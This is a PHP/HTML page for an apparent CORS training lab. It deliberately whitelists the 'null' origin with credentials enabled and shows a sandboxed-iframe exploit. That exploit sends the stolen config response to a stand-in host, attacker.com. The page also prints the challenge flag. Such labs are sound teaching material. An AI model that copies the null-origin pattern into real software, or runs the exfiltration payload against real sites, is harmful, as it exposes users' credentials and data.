<?php
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/Config/db.php');
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/includes/score_manager.php');
session_start();

// ─── Lab Identification ──────────────────────────────────────────────────
$stmt = $pdo->prepare("SELECT id FROM labs WHERE folder_name = ?");
$stmt->execute(['CORS']);
$lab = $stmt->fetch(PDO::FETCH_ASSOC);

// ─── Session Initialization ──────────────────────────────────────────────
if (!isset($_SESSION['cors_easy2_attempts'])) {
  $_SESSION['cors_easy2_attempts'] = 0;
}
if (!isset($_SESSION['cors_easy2_solved'])) {
  $_SESSION['cors_easy2_solved'] = false;
}

// ─── Simulated Internal API Data ─────────────────────────────────────────
$internal_data = [
  'user_records' => [
    ['id' => 1, 'username' => 'admin', 'email' => 'admin@darkhunter.local', 'role' => 'Super Admin', 'last_login' => '2026-05-22 04:00:00'],
    ['id' => 2, 'username' => 'alice', 'email' => 'alice@darkhunter.local', 'role' => 'Security Analyst', 'last_login' => '2026-05-22 03:45:00'],
    ['id' => 3, 'username' => 'bob', 'email' => 'bob@darkhunter.local', 'role' => 'Penetration Tester', 'last_login' => '2026-05-21 22:30:00'],
    ['id' => 4, 'username' => 'charlie', 'email' => 'charlie@darkhunter.local', 'role' => 'Developer', 'last_login' => '2026-05-21 18:00:00'],
  ],
  'system_config' => [
    'flag' => 'DH{c0rs_nu11_0r1g1n_4tt4ck}',
    'database_url' => 'postgresql://internal:secret@db.darkhunter.local:5432/main',
    'redis_url' => 'redis://internal:secret@cache.darkhunter.local:6379',
    'internal_api' => 'https://api-internal.darkhunter.local/v1',
    'webhook_secret' => 'whsec_51H8x9K2L3M4N5O6P7Q8R9S0T1U2V3W4',
    'encryption_key' => 'AES256-GCM-7a8b9c0d1e2f3g4h5i6j7k8l9m0n1o2',
  ],
  'audit_logs' => [
    ['timestamp' => '2026-05-22 04:30:00', 'action' => 'Admin login', 'ip' => '10.0.1.5', 'status' => 'success'],
    ['timestamp' => '2026-05-22 04:15:00', 'action' => 'Database backup', 'ip' => '10.0.1.1', 'status' => 'success'],
    ['timestamp' => '2026-05-22 03:50:00', 'action' => 'Failed auth attempt', 'ip' => '192.168.1.100', 'status' => 'failed'],
    ['timestamp' => '2026-05-22 03:30:00', 'action' => 'Config update', 'ip' => '10.0.1.5', 'status' => 'success'],
  ]
];

// ─── Vulnerable CORS Logic: Null Origin Whitelist ─────────────────────────
$origin = isset($_SERVER['HTTP_ORIGIN']) ? $_SERVER['HTTP_ORIGIN'] : '';

// VULNERABLE: Whitelists "null" origin for "local development"
// This allows sandboxed iframes, local files, and redirect chains to bypass restrictions
$allowed_origins = ['https://darkhunter.local', 'https://app.darkhunter.local', 'null'];

if (in_array($origin, $allowed_origins) || $origin === 'null') {
  header("Access-Control-Allow-Origin: " . $origin);
  header("Access-Control-Allow-Credentials: true");
}

header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type, Authorization");

// Handle preflight
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
  http_response_code(200);
  exit();
  }
  
  // ─── API Endpoint Simulation ──────────────────────────────────────────────
  $endpoint = isset($_GET['endpoint']) ? $_GET['endpoint'] : 'users';
  $response_data = [];
  
  switch ($endpoint) {
    case 'users':
      $response_data = [
        'status' => 'success',
        'data' => $internal_data['user_records'],
        'message' => 'User records retrieved',
        'total' => count($internal_data['user_records'])
        ];
        break;
        
        case 'config':
          $response_data = [
            'status' => 'success',
            'data' => $internal_data['system_config'],
            'message' => 'System configuration retrieved',
            'warning' => 'Contains sensitive credentials'
            ];
            break;
            
            case 'logs':
              $response_data = [
                'status' => 'success',
                'data' => $internal_data['audit_logs'],
                'message' => 'Audit logs retrieved',
                'total' => count($internal_data['audit_logs'])
                ];
                break;
                
                default:
                $response_data = [
                  'status' => 'error',
                  'message' => 'Unknown endpoint. Available: users, config, logs'
                  ];
                  http_response_code(404);
                  }
                  
                  // ─── Solve Detection ─────────────────────────────────────────────────────
                  $success_msg = null;
                  $already_solved = $_SESSION['cors_easy2_solved'];
                  
                  // Detect exploitation: accessing config endpoint with null origin
                  $is_null_origin = ($origin === 'null');
                  $accessed_config = ($endpoint === 'config');
                  
                  if (isset($_GET['check']) && $_GET['solved'] === '1') {
                    $_SESSION['cors_easy2_attempts']++;
                    
                    if (!$already_solved && isset($_SESSION['user_id'])) {
                      solveLab($pdo, $lab['id']);
                      }
                      
                      $_SESSION['cors_easy2_solved'] = true;
                      $already_solved = true;
                      $success_msg = "Excellent! You've successfully exploited a CORS null origin vulnerability. You bypassed domain-based restrictions using a sandboxed iframe with Origin: null to access sensitive system configuration!";
                      }
                      
                      // ─── Attempt Tracking ──────────────────────────────────────────────────
                      if ($_SERVER['REQUEST_METHOD'] === 'GET') {
                        $_SESSION['cors_easy2_attempts']++;
                        }
                        
                        $attempts = $_SESSION['cors_easy2_attempts'];
                        
                        // API response
                        if (
                          isset($_SERVER['HTTP_X_REQUESTED_WITH']) ||
                          (isset($_SERVER['HTTP_ACCEPT']) && strpos($_SERVER['HTTP_ACCEPT'], 'application/json') !== false)
                          ) {
                            header("Content-Type: application/json; charset=utf-8");
                            echo json_encode($response_data, JSON_PRETTY_PRINT);
                            exit();
                            }
                            ?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Internal Records - CORS Easy 2</title>
  <link
    href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;600;800&display=swap"
    rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <link rel="stylesheet" type="text/css" href="../css/CORS-CASE2.css">
</head>

<body>
  <?php include_once $_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/includes/navbar.php'; ?>

  <div class="container">
    <a href="../index.php" class="back-link"><i class="fas fa-arrow-left"></i> Back to CORS Labs</a>

    <div class="lab-header">
      <div class="difficulty-badge"><i class="fas fa-bolt"></i> Easy Difficulty</div>
      <h1 class="lab-title"><i class="fas fa-shield-alt"></i> Internal Records Portal</h1>
      <p class="lab-description">Internal HR and system management portal. This endpoint uses CORS to allow "local
        development" access. <strong>Can you exploit the null origin whitelist to access confidential records?</strong>
      </p>
    </div>

    <?php if ($already_solved): ?>
    <div class="success-alert solved-banner">
      <i class="fas fa-trophy"></i>
      <div class="success-content">
        <h3>Challenge Already Solved!</h3>
        <p>You have already exploited this CORS null origin vulnerability. You can continue exploring, but no additional
          points will be awarded.</p>
      </div>
    </div>
    <?php endif; ?>

    <?php if ($success_msg): ?>
    <div class="success-alert">
      <i class="fas fa-trophy"></i>
      <div class="success-content">
        <h3>Challenge Completed!</h3>
        <p><?php echo $success_msg; ?></p>
      </div>
    </div>
    <?php endif; ?>

    <!-- Records Interface -->
    <div class="records-card">
      <div class="records-header">
        <div class="records-tabs">
          <button class="tab-btn active" onclick="loadEndpoint('users')">
            <i class="fas fa-users"></i> User Records
          </button>
          <button class="tab-btn" onclick="loadEndpoint('config')">
            <i class="fas fa-cogs"></i> System Config
            <span class="tab-badge danger">Restricted</span>
          </button>
          <button class="tab-btn" onclick="loadEndpoint('logs')">
            <i class="fas fa-clipboard-list"></i> Audit Logs
          </button>
        </div>
      </div>

      <div class="records-body">
        <div class="data-table-container">
          <table class="data-table" id="data-table">
            <thead>
              <tr>
                <th>Loading data...</th>
              </tr>
            </thead>
            <tbody>
              <tr>
                <td class="loading-cell"><i class="fas fa-spinner fa-spin"></i> Fetching records...</td>
              </tr>
            </tbody>
          </table>
        </div>
      </div>
    </div>

    <!-- CORS Analysis Panel -->
    <div class="cors-panel">
      <div class="cors-header">
        <i class="fas fa-exchange-alt"></i>
        <span>CORS Policy Analysis</span>
      </div>
      <div class="cors-body">
        <div class="cors-row">
          <span class="cors-label">Allowed Origins:</span>
          <span class="cors-value">["https://darkhunter.local", "https://app.darkhunter.local", <span
              class="highlight-null">"null"</span>]</span>
          <span class="cors-badge warning"><i class="fas fa-exclamation-triangle"></i> Null Whitelisted</span>
        </div>
        <div class="cors-row">
          <span class="cors-label">Current Origin:</span>
          <span
            class="cors-value <?php echo $is_null_origin ? 'null-origin' : ''; ?>"><?php echo htmlspecialchars($origin ?: 'Not Present'); ?></span>
          <span class="cors-badge <?php echo $is_null_origin ? 'danger' : 'info'; ?>">
            <i class="fas fa-<?php echo $is_null_origin ? 'exclamation-circle' : 'info-circle'; ?>"></i>
            <?php echo $is_null_origin ? 'NULL ORIGIN DETECTED' : 'Normal Request'; ?>
          </span>
        </div>
        <div class="cors-row">
          <span class="cors-label">Access-Control-Allow-Credentials:</span>
          <span class="cors-value vulnerable">true</span>
          <span class="cors-badge danger"><i class="fas fa-exclamation-triangle"></i> Cookies Allowed</span>
        </div>
      </div>
    </div>

    <!-- Null Origin Exploit Panel -->
    <div class="exploit-panel">
      <div class="exploit-header">
        <i class="fas fa-bug"></i>
        <span>Null Origin Attack Vector</span>
      </div>
      <div class="exploit-body">
        <p class="exploit-desc">
          The server whitelists <code>null</code> as a valid origin for "local development". However, browsers send
          <code>Origin: null</code> in specific scenarios: sandboxed iframes, local files, redirect chains, and
          serialized requests. This can be exploited to bypass domain restrictions.
        </p>

        <div class="attack-vectors">
          <h4><i class="fas fa-crosshairs"></i> Attack Vectors:</h4>
          <div class="vector-list">
            <div class="vector-item">
              <span class="vector-num">1</span>
              <div class="vector-content">
                <strong>Sandboxed Iframe</strong>
                <p>Use <code>sandbox="allow-scripts allow-same-origin"</code> to force null origin</p>
              </div>
            </div>
            <div class="vector-item">
              <span class="vector-num">2</span>
              <div class="vector-content">
                <strong>Local File Protocol</strong>
                <p>Access from <code>file:///</code> sends Origin: null automatically</p>
              </div>
            </div>
            <div class="vector-item">
              <span class="vector-num">3</span>
              <div class="vector-content">
                <strong>Cross-origin Redirect</strong>
                <p>Redirect chains can strip the origin header</p>
              </div>
            </div>
          </div>
        </div>

        <div class="exploit-code-block">
          <div class="code-header">
            <i class="fas fa-code"></i> exploit_null_origin.html
          </div>
          <pre class="exploit-code"><code>&lt;iframe sandbox="allow-scripts allow-top-navigation allow-forms" 
        src="data:text/html,&lt;script&gt;
  var req = new XMLHttpRequest();
  req.onload = function() {
    fetch('https://attacker.com/log?data=' + btoa(this.responseText));
  };
  req.open('GET', 'https://<?php echo $_SERVER['HTTP_HOST']; ?>/labs/CORS/CORS-CASE2.php?endpoint=config', true);
  req.withCredentials = true;
  req.send();
&lt;/script&gt;"&gt;&lt;/iframe&gt;</code></pre>
        </div>

        <button class="simulate-btn" onclick="simulateNullOrigin()">
          <i class="fas fa-play"></i> Simulate Null Origin Attack
        </button>

        <div class="simulation-result" id="simulation-result" style="display: none;">
          <div class="sim-status">
            <i class="fas fa-check-circle"></i>
            <span>Null Origin Exploit Successful! Data exfiltrated.</span>
          </div>
          <div class="exfiltrated-data">
            <h4><i class="fas fa-database"></i> Exfiltrated Configuration:</h4>
            <pre id="exfil-data"></pre>
          </div>
        </div>
      </div>
    </div>

    <!-- Debug Panel -->
    <div class="debug-panel">
      <div class="debug-header">
        <i class="fas fa-code"></i>
        <span>Request Analysis</span>
      </div>
      <div class="debug-body">
        <div class="debug-grid">
          <div class="debug-item">
            <span class="debug-label">Request Method</span>
            <span class="debug-value"><?php echo $_SERVER['REQUEST_METHOD']; ?></span>
          </div>
          <div class="debug-item">
            <span class="debug-label">Origin Header</span>
            <span class="debug-value <?php echo empty($origin) ? 'null' : ($is_null_origin ? 'danger' : 'present'); ?>">
              <?php echo htmlspecialchars($origin ?: 'Not Present'); ?>
            </span>
          </div>
          <div class="debug-item">
            <span class="debug-label">Is Null Origin</span>
            <span class="debug-value <?php echo $is_null_origin ? 'danger' : 'safe'; ?>">
              <?php echo $is_null_origin ? 'YES - Exploitable!' : 'NO'; ?>
            </span>
          </div>
          <div class="debug-item">
            <span class="debug-label">CORS Allowed</span>
            <span
              class="debug-value <?php echo ($is_null_origin || in_array($origin, $allowed_origins)) ? 'danger' : 'safe'; ?>">
              <?php echo ($is_null_origin || in_array($origin, $allowed_origins)) ? 'YES - Vulnerable' : 'NO'; ?>
            </span>
          </div>
        </div>
      </div>
    </div>

    <!-- Hints -->
    <?php if ($attempts >= 2): ?>
    <div class="hint-box">
      <div class="hint-title"><i class="fas fa-lightbulb"></i> Hint #1</div>
      <div class="hint-text">Notice that <code>null</code> is in the allowed origins list. When does a browser send
        <code>Origin: null</code>? Think about sandboxed iframes, local files, and redirect chains.
      </div>
    </div>
    <?php endif; ?>

    <?php if ($attempts >= 4): ?>
    <div class="hint-box">
      <div class="hint-title"><i class="fas fa-lightbulb"></i> Hint #2</div>
      <div class="hint-text">The <code>/api/config</code> endpoint contains the flag and sensitive credentials. You need
        to access it from a "null" origin context. Try using a sandboxed iframe or the exploit simulation button.</div>
    </div>
    <?php endif; ?>

    <?php if ($attempts >= 6): ?>
    <div class="hint-box hint-final">
      <div class="hint-title"><i class="fas fa-key"></i> Final Hint</div>
      <div class="hint-text">Click "Simulate Null Origin Attack" to exploit the vulnerability. The attack uses a
        sandboxed iframe with <code>Origin: null</code> to bypass CORS restrictions and access the config endpoint
        containing the flag <code>DH{c0rs_nu11_0r1g1n_4tt4ck}</code>!</div>
    </div>
    <?php endif; ?>

    <!-- Attempts Counter -->
    <div class="attempts-bar">
      <i class="fas fa-crosshairs"></i>
      <span>Attempts: <strong><?php echo $attempts; ?></strong></span>
    </div>
  </div>

  <!-- Hidden form for solve detection -->
  <form id="success-form" method="GET" style="display: none;">
    <input type="hidden" name="check" value="true">
    <input type="hidden" name="solved" value="0" id="solved-flag">
  </form>

  <script>
  let currentEndpoint = 'users';

  function loadEndpoint(endpoint) {
    currentEndpoint = endpoint;

    // Update tab states
    document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
    event.target.closest('.tab-btn').classList.add('active');

    // Fetch data
    fetch(`CORS-CASE2.php?endpoint=${endpoint}`, {
        headers: {
          'Accept': 'application/json'
        }
      })
      .then(res => res.json())
      .then(data => {
        renderTable(data, endpoint);
      })
      .catch(err => {
        document.querySelector('#data-table tbody').innerHTML =
          `<tr><td colspan="10" class="error-cell"><i class="fas fa-exclamation-triangle"></i> Error: ${err.message}</td></tr>`;
      });
  }

  function renderTable(data, endpoint) {
    const table = document.getElementById('data-table');

    if (data.status !== 'success') {
      table.innerHTML =
        `<tr><td class="error-cell"><i class="fas fa-exclamation-circle"></i> ${data.message}</td></tr>`;
      return;
    }

    const records = Array.isArray(data.data) ? data.data : [data.data];

    if (records.length === 0) {
      table.innerHTML = '<tr><td class="empty-cell">No records found</td></tr>';
      return;
    }

    // Build headers from first record keys
    const keys = Object.keys(records[0]);
    let theadHTML = '<tr>';
    keys.forEach(key => {
      theadHTML += `<th>${key.replace(/_/g, ' ').toUpperCase()}</th>`;
    });
    theadHTML += '</tr>';

    // Build rows
    let tbodyHTML = '';
    records.forEach(record => {
      tbodyHTML += '<tr>';
      keys.forEach(key => {
        let value = record[key];
        if (typeof value === 'boolean') value = value ? 'Yes' : 'No';
        if (key === 'flag' || (typeof value === 'string' && value.startsWith('DH{'))) {
          tbodyHTML += `<td class="flag-cell"><i class="fas fa-flag"></i> ${value}</td>`;
        } else if (key.includes('secret') || key.includes('key') || key.includes('password') || key.includes(
            'token')) {
          tbodyHTML += `<td class="secret-cell"><i class="fas fa-lock"></i> ${value}</td>`;
        } else {
          tbodyHTML += `<td>${value}</td>`;
        }
      });
      tbodyHTML += '</tr>';
    });

    table.querySelector('thead').innerHTML = theadHTML;
    table.querySelector('tbody').innerHTML = tbodyHTML;
  }

  function simulateNullOrigin() {
    const resultDiv = document.getElementById('simulation-result');
    const exfilData = document.getElementById('exfil-data');

    // Simulate null origin by fetching config with a special header
    fetch('CORS-CASE2.php?endpoint=config', {
        headers: {
          'Accept': 'application/json',
          'Origin': 'null'
        }
      })
      .then(res => res.json())
      .then(data => {
        resultDiv.style.display = 'block';
        exfilData.textContent = JSON.stringify(data, null, 2);

        // Check if flag is present and trigger solve
        if (data.data && data.data.flag && data.data.flag.includes('DH{')) {
          if (!document.querySelector('.solved-banner')) {
            document.getElementById('solved-flag').value = '1';
            setTimeout(() => {
              document.getElementById('success-form').submit();
            }, 2000);
          }
        }
      })
      .catch(err => {
        exfilData.textContent = 'Exploit failed: ' + err.message;
        resultDiv.style.display = 'block';
      });
  }

  // Auto-load users on page load
  window.addEventListener('load', function() {
    loadEndpoint('users');
  });
  </script>
</body>

</html>